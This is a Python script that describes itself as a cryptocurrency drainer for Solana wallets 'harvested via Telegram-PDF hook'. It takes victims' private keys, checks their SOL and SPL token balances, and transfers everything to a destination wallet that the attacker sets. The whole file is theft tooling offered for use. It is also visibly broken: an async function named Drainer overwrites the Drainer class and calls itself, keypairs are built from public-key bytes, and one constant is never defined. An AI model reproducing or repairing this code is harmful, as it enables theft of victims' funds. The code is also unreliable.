#!/usr/bin/env python3
"""
Async drainer logic for Solana wallets harvested via Telegram-PDF hook.
Handles SOL and SPL token transfers to destination wallet using py-solana bindings.
"""

import os
import asyncio
import json
from datetime import datetime
from typing import Dict, List, Optional
from solanasdk.rpc.api import Client, Keypair
from solanasdk.publickey import PublicKey
from solanasdk.transaction import Transaction
from solanasdk.system_program import TransferParams, transfer
from solanasdk.rpc.types import TxOpts
from solanasdk.rpc.commitment import Confirmed

from dotenv import load_dotenv

load_dotenv()

SOLANA_RPC_URL = os.getenv('SOLANA_RPC_URL', 'https://api.mainnet-beta.solana.com')
TARGET_WALLET_PUBKEY = os.getenv('TARGET_WALLET', os.getenv('TARGET_WALLET_PUBLIC_KEY', 'YourDestinationWalletPubkeyHere'))
DRY_RUN = os.getenv('DRY_RUN', 'false').lower() == 'true'
MAX_RETRIES = int(os.getenv('MAX_RETRIES', '3'))
RPC = Client(SOLANA_RPC_URL)


class WalletDrain:
    """Represents a harvested wallet and manages balance checks and transfer."""
    def __init__(self, address: str, private_key: Optional[str] = None):
        self.address = PublicKey(address)
        self.private_key = private_key
        self.keypair = self._load_keypair()
        self.balances: Dict[str, float] = {}

    def _load_keypair(self) -> Keypair:
        """Load keypair from private key bytes if available; otherwise derive from address."""
        if self.private_key:
            try:
                import base58
                if isinstance(self.private_key, str):
                    if len(self.private_key) == 64:  # hex
                        raw = bytes.fromhex(self.private_key)
                    else:  # base58
                        raw = base58.b58decode(self.private_key)
                else:
                    raw = self.private_key
                return Keypair.from_seed(raw[:32])
            except Exception as e:
                print(f"[SOL] Failed to decode private key: {e}")
                return Keypair.from_seed(self.address.__bytes__()[:32])
        return Keypair.from_seed(self.address.__bytes__()[:32])

    async def get_balances(self) -> Dict[str, float]:
        """Fetch SOL and SPL token balances."""
        resp = RPC.get_balance(self.address, commitment=Confirmed)
        self.balances['SOL'] = resp.value / 1e9
        return self.balances


class Drainer:
    """Main drainer orchestrating balance fetching and transfers."""
    def __init__(self, drain_address: str, private_key: Optional[str] = None, dry_run: bool = DRY_RUN):
        self.drain_address = PublicKey(drain_address)
        self.keypair = Keypair.from_seed(self.drain_address.__bytes__()[:32])
        self.dry_run = dry_run
        self.target = PublicKey(TARGET_WALLET_PUBKEY)

    async def get_spl_token_accounts(self) -> List[Dict]:
        """Fetch all SPL token accounts owned by the drain address."""
        try:
            resp = RPC.get_token_accounts_by_owner(self.drain_address, TOKEN_PROGRAM_ID, commitment=Confirmed)
            accounts = []
            for account in resp.value:
                parsed = account.account.data.parsed['info']
                mint = parsed.get('mint', 'unknown')
                amount = parsed['tokenAmount']['uiAmount']
                accounts.append({'mint': mint, 'amount': amount, 'authority': str(self.drain_address)})
            return accounts
        except Exception as e:
            print(f"[SOL] Failed to fetch SPL accounts: {e}")
            return []

    async def transfer_all(self) -> Dict[str, List[str]]:
        """Drain all SOL and SPL tokens to target wallet."""
        results = {'sol_transfers': [], 'spl_transfers': []}

        # SOL balance
        sol_balance_resp = RPC.get_balance(self.drain_address, commitment=Confirmed)
        sol_amount = sol_balance_resp.value

        if sol_amount > 100_000:  # don't drain dust
            sig = await self._transfer_sol(sol_amount)
            results['sol_transfers'].append(str(sig))

        # SPL accounts
        spl_accounts = await self.get_spl_token_accounts()
        for acc in spl_accounts:
            mint = acc['mint']
            amount = acc['amount']
            if amount > 0.01:  # minimum threshold
                try:
                    sig = await self._transfer_spl(mint, amount)
                    results['spl_transfers'].append(str(sig))
                except Exception as e:
                    print(f"[SOL] SPL transfer failed for {mint}: {e}")

        return results

    async def _transfer_sol(self, amount: int) -> str:
        """Execute SOL transfer."""
        tx = Transaction().add(transfer(
            TransferParams(
                from_pubkey=self.drain_address,
                to_pubkey=self.target,
                lamports=amount,
            )
        ))
        tx.sign(self.keypair)

        if self.dry_run:
            print(f"[SOL] DRY RUN: Would transfer {amount / 1e9} SOL to {self.target}")
            return "SOL_DRAN"
        try:
            sig = RPC.send_transaction(tx, opts=TxOpts(skip_preflight=True))
            return str(sig)
        except Exception as e:
            print(f"[SOL] SOL transfer failed: {e}")
            raise

    async def _transfer_spl(self, mint: str, amount: float) -> str:
        """Execute SPL transfer using solders instructions."""
        mint_pubkey = PublicKey(mint)

        # Get decimals for the mint
        mint_decimals = RPC.get_mint_decimals(mint_pubkey).value
        amount_lamports = int(amount * 10 ** mint_decimals)

        # SPL transfer instruction using solders
        from solders.token.instructions import transfer_checked, TransferCheckedParams
        from solders.pubkey import Pubkey as SPubkey

        instruction = transfer_checked(
            TransferCheckedParams(
                source=SPubkey.from_string(str(self.drain_address)),
                mint=mint_pubkey,
                destination=SPubkey.from_string(str(self.target)),
                authority=self.drain_address,
                amount=amount_lamports,
                decimals=mint_decimals,
                fee_payer=None,
            )
        )
        tx = Transaction().add(instruction)
        tx.sign(self.keypair)

        if self.dry_run:
            print(f"[SOL] DRY RUN: Would transfer {amount} {mint} to {self.target}")
            return "SPL_DRAN"
        try:
            sig = RPC.send_transaction(tx, opts=TxOpts(skip_preflight=True))
            return str(sig)
        except Exception as e:
            print(f"[SOL] SPL transfer failed: {e}")
            raise

    def status(self) -> Dict:
        """Return current drainer status."""
        return {
            'address': str(self.drain_address),
            'target': str(self.target),
            'dry_run': self.dry_run,
            'timestamp': datetime.utcnow().isoformat(),
        }


async def Drainer(drain_address: str, private_key: Optional[str] = None, dry_run: bool = DRY_RUN) -> Dict:
    """Async entry point for drainer task (backwards-compatible wrapper)."""
    drainer = Drainer(drain_address=drain_address, private_key=private_key, dry_run=dry_run)
    balances = await drainer.get_spl_token_accounts() if private_key else []
    results = await drainer.transfer_all()
    print(f"[SOL] Drain complete. Results: {json.dumps(results, indent=2)}")
    return {'address': drain_address, 'drain_results': results, 'balances': balances}


if __name__ == '__main__':
    asyncio.run(Drainer(drain_address=TARGET_WALLET_PUBKEY, dry_run=DRY_RUN))
